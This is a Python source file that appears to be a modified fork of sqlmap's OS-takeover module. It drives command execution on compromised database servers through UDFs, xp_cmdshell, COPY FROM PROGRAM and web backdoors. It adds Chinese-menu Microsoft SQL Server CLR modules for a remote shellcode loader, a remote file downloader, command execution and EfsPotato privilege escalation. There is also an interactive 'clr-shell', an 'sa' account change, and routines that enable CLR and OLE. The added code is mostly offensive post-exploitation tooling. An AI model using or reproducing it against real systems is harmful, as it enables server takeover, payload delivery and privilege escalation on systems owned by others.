#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import sys
import time
from lib.core.common import Backend
from lib.core.common import dataToStdout
from lib.core.common import getSQLSnippet
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import AUTOCOMPLETE_TYPE
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.shell import autoCompletion
from lib.request import inject
from lib.takeover.udf import UDF
from lib.takeover.web import Web
from lib.takeover.xp_cmdshell import XP_cmdshell
from lib.takeover.clr_exploit import CLR_exploit
from lib.utils.safe2bin import safechardecode
from thirdparty.six.moves import input as _input

class Abstraction(Web, UDF, XP_cmdshell, CLR_exploit):
    """
    This class defines an abstraction layer for OS takeover functionalities
    to UDF / XP_cmdshell objects
    """

    def __init__(self):
        self.envInitialized = False
        self.alwaysRetrieveCmdOutput = False

        UDF.__init__(self)
        Web.__init__(self)
        XP_cmdshell.__init__(self)
        CLR_exploit.__init__(self)

    def execCmd(self, cmd, silent=False):
        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
            self.copyExecCmd(cmd)

        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            self.webBackdoorRunCmd(cmd)

        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            self.udfExecCmd(cmd, silent=silent)

        elif Backend.isDbms(DBMS.MSSQL):
            self.xpCmdshellExecCmd(cmd, silent=silent)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise SqlmapUnsupportedFeatureException(errMsg)

    def evalCmd(self, cmd, first=None, last=None):
        retVal = None

        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
            retVal = self.copyExecCmd(cmd)

        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            retVal = self.webBackdoorRunCmd(cmd)

        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            retVal = self.udfEvalCmd(cmd, first, last)

        elif Backend.isDbms(DBMS.MSSQL):
            retVal = self.xpCmdshellEvalCmd(cmd, first, last)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise SqlmapUnsupportedFeatureException(errMsg)

        return safechardecode(retVal)

    def runCmd(self, cmd):
        choice = None

        if not self.alwaysRetrieveCmdOutput:
            message = "do you want to retrieve the command standard "
            message += "output? [Y/n/a] "
            choice = readInput(message, default='Y').upper()

            if choice == 'A':
                self.alwaysRetrieveCmdOutput = True

        if choice == 'Y' or self.alwaysRetrieveCmdOutput:
            output = self.evalCmd(cmd)

            if output:
                conf.dumper.string("command standard output", output)
            else:
                dataToStdout("No output\n")
        else:
            self.execCmd(cmd)

    def shell(self):
        if self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            infoMsg = "calling OS shell. To quit type "
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        else:
            if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
                infoMsg = "going to use 'COPY ... FROM PROGRAM ...' "
                infoMsg += "command execution"
                logger.info(infoMsg)

            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                infoMsg = "going to use injected user-defined functions "
                infoMsg += "'sys_eval' and 'sys_exec' for operating system "
                infoMsg += "command execution"
                logger.info(infoMsg)

            elif Backend.isDbms(DBMS.MSSQL):
                infoMsg = "going to use extended procedure 'xp_cmdshell' for "
                infoMsg += "operating system command execution"
                logger.info(infoMsg)

            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise SqlmapUnsupportedFeatureException(errMsg)

            infoMsg = "calling %s OS shell. To quit type " % (Backend.getOs() or "Windows")
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        autoCompletion(AUTOCOMPLETE_TYPE.OS, OS.WINDOWS if Backend.isOs(OS.WINDOWS) else OS.LINUX)

        while True:
            command = None

            try:
                command = _input("os-shell> ")
                command = getUnicode(command, encoding=sys.stdin.encoding)
            except KeyboardInterrupt:
                print()
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print()
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ("x", "q", "exit", "quit"):
                break

            self.runCmd(command)

    def runClr(self,function, cmd):
        if Backend.isDbms(DBMS.MSSQL):
            self.clrShellExecCmd(function, cmd, silent=False)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise SqlmapUnsupportedFeatureException(errMsg)

    def clrInstall1(self, currentDb, dll_name, udf_assembly_name, procedure_class_name, procedure_function_name):
        try:
            if not self.set_permission(currentDb):
                logger.error("Set permission error")
                return
            time.sleep(1)
            if not self.create_assembly1(dll_name,udf_assembly_name):
                logger.error("Create assembly error")
                return
            time.sleep(1)
            if not self.create_procedure(udf_assembly_name,procedure_class_name,procedure_function_name):
                logger.error("Create procedure error.")
                return
            logger.info("The process has ended, and you can use --check-clr to determine if the installation was successful")
            logger.info("流程结束，可以使用--check-clr判断是否安装成功")
            self.self_clr = True
        except Exception as e:
            logger.error(e)
            return False

    def clrInstall2(self, currentDb, dll_name, udf_assembly_name, procedure_class_name, procedure_function_name):
        try:
            if not self.set_permission(currentDb):
                logger.error("Set permission error")
                return
            time.sleep(1)
            if not self.create_assembly2(dll_name,udf_assembly_name):
                logger.error("Create assembly error")
                return
            time.sleep(1)
            if not self.create_procedure(udf_assembly_name,procedure_class_name,procedure_function_name):
                logger.error("Create procedure error.")
                return
            logger.info("The process has ended, and you can use --check-clr to determine if the installation was successful")
            logger.info("流程结束，可以使用--check-clr判断是否安装成功")
            self.self_clr = True
        except Exception as e:
            logger.error(e)
            return False

    def clrEnable(self):
        self.enable_clr()

    def oleEnable(self):
        self.enable_ole()

    def changeSa(self,currentdb):
        self.change_sa(currentdb)

    def clrDisable(self):
        self.disable_clr()

    def procedureCheck(self):
        print("请选择一个选项：")
        print("【1】ShellcodeLoader")
        print("【2】RemoteDownload")
        print("【3】Exec")
        print("【4】EfsPotato")
        print("【5】UserDefined")
        choice = int(input("请输入需要检查的存储过程编号: "))
        if choice == 1:
            self.check_procedure("ClrShellcodeLoader")

        elif choice == 2:
            self.check_procedure("ClrDownload")

        elif choice == 3:
            self.check_procedure("ClrExec")

        elif choice == 4:
            self.check_procedure("ClrEfsPotato")

        elif choice == 5:
            fuction_name = input("请输入需要查询的存储过程名称: ")
            self.check_procedure(fuction_name)

    def clrDel(self):
        print("请选择一个选项：")
        print("【1】ShellcodeLoader")
        print("【2】RemoteDownload")
        print("【3】Exec")
        print("【4】EfsPotato")
        print("【5】UserDefined")
        print("【6】ALL【1-4】")

        choice = int(input("请输入选项编号: "))
        if choice == 1:
            self.del_clr("ClrShellcodeLoader", "ClrShellcodeLoader")

        elif choice == 2:
            self.del_clr("ClrDownload", "ClrDownload")

        elif choice == 3:
            self.del_clr("ClrExec", "ClrExec")

        elif choice == 4:
            self.del_clr("ClrEfsPotato", "ClrEfsPotato")

        elif choice == 5:
            procedure_name = input("INPUT PROCEDURE NAME: ")
            assembly_name = input("INPUT ASSEMBLY NAME: ")
            self.del_clr(procedure_name,assembly_name)

        elif choice == 6:
            self.del_clr("ClrShellcodeLoader", "ClrShellcodeLoader")
            self.del_clr("ClrDownload", "ClrDownload")
            self.del_clr("ClrExec", "ClrExec")
            self.del_clr("ClrEfsPotato", "ClrEfsPotato")

    def shellClr(self):
        if self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            infoMsg = "calling OS shell. To quit type "
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        else:
            if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
                infoMsg = "going to use 'COPY ... FROM PROGRAM ...' "
                infoMsg += "command execution"
                logger.info(infoMsg)

            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                infoMsg = "going to use injected user-defined functions "
                infoMsg += "'sys_eval' and 'sys_exec' for operating system "
                infoMsg += "command execution"
                logger.info(infoMsg)

            elif Backend.isDbms(DBMS.MSSQL):
                infoMsg = "going to use extended procedure 'clr.exec' for "
                infoMsg += "operating system command execution"
                logger.info(infoMsg)

            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise SqlmapUnsupportedFeatureException(errMsg)

            infoMsg = "calling %s OS shell. To quit type " % (Backend.getOs() or "Windows")
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        autoCompletion(AUTOCOMPLETE_TYPE.OS, OS.WINDOWS if Backend.isOs(OS.WINDOWS) else OS.LINUX)

        print("请选择一个选项：")
        print("【1】ShellcodeLoader")
        print("【2】RemoteDownload")
        print("【3】Exec")
        print("【4】EfsPotato")
        print("【5】UserDefined")
        choice = int(input("请输入选项编号: "))
        print("【提示】所有模块执行均无回显，命令执行模块如果需要判断是否成功可以将执行结果输出到web目录或使用--ole-read读取内容")

        if choice == 1:
            function = "ClrShellcodeLoader"
            print("【提示】当前使用的是 ClrShellcodeLoader ，该CLR模块的使用方法：clr_scloader1 远程shellcode文件 key\n")

        elif choice == 2:
            function = "ClrDownload"
            print("【提示】当前使用的是 ClrDownload ，该CLR模块的使用方法：clr_download http://xxx/xxx.png c:/xxx/xx.png \n")

        elif choice == 3:
            function ="ClrExec"
            print("【提示】当前使用的是 ClrExec ，该CLR模块的使用方法：clr_exec 拼接需要执行的命令\n")

        elif choice == 4:
            function = "ClrEfsPotato"
            print("【提示】当前使用的是 ClrEfsPotato，该CLR模块的使用方法：clr_efspotato 拼接需要执行的命令\n")

        elif choice == 5:
            function = _input("input procedure name> ")

        while True:
            command = None

            try:
                command = _input("clr-shell> ")
                command = getUnicode(command, encoding=sys.stdin.encoding)
            except KeyboardInterrupt:
                print()
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print()
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ("x", "q", "exit", "quit"):
                break

            self.runClr(function , command)
            print('attempting to execute clr stored procedure...')
            print('【提示】正在尝试执行clr存储过程，执行无回显，需要自行判断是否成功\n')

    def _initRunAs(self):
        if not conf.dbmsCred:
            return

        if not conf.direct and not isStackingAvailable():
            errMsg = "stacked queries are not supported hence sqlmap cannot "
            errMsg += "execute statements as another user. The execution "
            errMsg += "will continue and the DBMS credentials provided "
            errMsg += "will simply be ignored"
            logger.error(errMsg)

            return

        if Backend.isDbms(DBMS.MSSQL):
            msg = "on Microsoft SQL Server 2005 and 2008, OPENROWSET function "
            msg += "is disabled by default. This function is needed to execute "
            msg += "statements as another DBMS user since you provided the "
            msg += "option '--dbms-creds'. If you are DBA, you can enable it. "
            msg += "Do you want to enable it? [Y/n] "

            if readInput(msg, default='Y', boolean=True):
                expression = getSQLSnippet(DBMS.MSSQL, "configure_openrowset", ENABLE="1")
                inject.goStacked(expression)

        # TODO: add support for PostgreSQL
        # elif Backend.isDbms(DBMS.PGSQL):
        #     expression = getSQLSnippet(DBMS.PGSQL, "configure_dblink", ENABLE="1")
        #     inject.goStacked(expression)

    def initEnv(self, mandatory=True, detailed=False, web=False, forceInit=False):
        self._initRunAs()

        if self.envInitialized and not forceInit:
            return

        if web:
            self.webInit()
        else:
            self.checkDbmsOs(detailed)

            if mandatory and not self.isDba():
                warnMsg = "functionality requested probably does not work because "
                warnMsg += "the current session user is not a database administrator"

                if not conf.dbmsCred and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                    warnMsg += ". You can try to use option '--dbms-cred' "
                    warnMsg += "to execute statements as a DBA user if you "
                    warnMsg += "were able to extract and crack a DBA "
                    warnMsg += "password by any mean"

                logger.warning(warnMsg)

            if any((conf.osCmd, conf.osShell)) and Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
                success = True
            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                success = self.udfInjectSys()

                if success is not True:
                    msg = "unable to mount the operating system takeover"
                    raise SqlmapFilePathException(msg)
            elif Backend.isDbms(DBMS.MSSQL):
                if mandatory:
                    self.xpCmdshellInit()
            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise SqlmapUnsupportedFeatureException(errMsg)

        self.envInitialized = True
